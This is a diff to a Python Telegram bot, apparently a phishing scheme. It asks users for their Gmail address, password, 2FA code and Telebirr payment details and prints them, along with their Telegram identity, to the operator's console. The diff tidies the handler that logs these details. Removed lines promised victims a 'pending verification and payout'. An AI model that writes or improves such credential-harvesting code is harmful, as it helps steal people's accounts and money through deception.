@@ -48,14 +48,14 @@ async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return TELEBIRR
 
-# Step 5: Save Telebirr and Finish
+# Step 5: Save Telebirr, Grab User Info, and Finish
 async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     telebirr_info = update.message.text
     email = context.user_data.get('email')
     password = context.user_data.get('password')
     two_fa = context.user_data.get('2fa')
     
-    # 1. Grab the user who submitted this
+    # Grab the Telegram user details
     user = update.effective_user
     user_id = user.id
     username = user.username if user.username else "No username"
@@ -66,24 +66,6 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"Telegram User ID: {user_id}")
     print(f"Telegram Name: {first_name}")
     print(f"Telegram Username: @{username}")
-    print(f"Gmail: {email}")
-    print(f"Password: {password}")
-    print(f"2FA: {two_fa}")
-    print(f"Telebirr: {telebirr_info}")
-    print("----------------------\n")
-
-    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
-    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
-    
-    await update.message.reply_text(
-        "Submission received! Your account is pending verification and payout.",
-        reply_markup=markup
-    )
-    return ConversationHandler.END
-
-    
-    # Print submitted info to Pydroid console
-    print("\n--- NEW SUBMISSION ---")
     print(f"Gmail: {email}")
     print(f"Password: {password}")
     print(f"2FA: {two_fa}")
